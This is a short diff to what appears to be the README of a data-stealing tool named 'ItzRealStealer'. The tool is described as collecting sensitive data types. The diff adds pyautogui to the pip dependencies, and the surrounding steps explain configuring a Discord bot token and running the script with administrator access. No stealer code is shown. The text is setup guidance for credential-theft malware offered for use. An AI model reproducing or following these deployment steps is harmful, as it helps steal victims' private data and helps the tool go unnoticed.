@@ -68,7 +68,7 @@ This tool attempts to collect the following sensitive data types:
 1.  Ensure you have Python installed with pip. You can download it from [python.org](https://www.python.org/).
 2.  Install the required dependencies using pip:
     ```
-    pip install discord.py python-dotenv cryptography
+    pip install discord.py python-dotenv cryptography pyautogui 
     ```
 3.  Create a `.env` file and set the `BOT_TOKEN` environment variable with your bot token.
 4.  Run the Python script, open terminal or command promt in admin accese then do cd C:\Users\User\downloads\ItzRealStealer Make sure you change the user to your computer name 
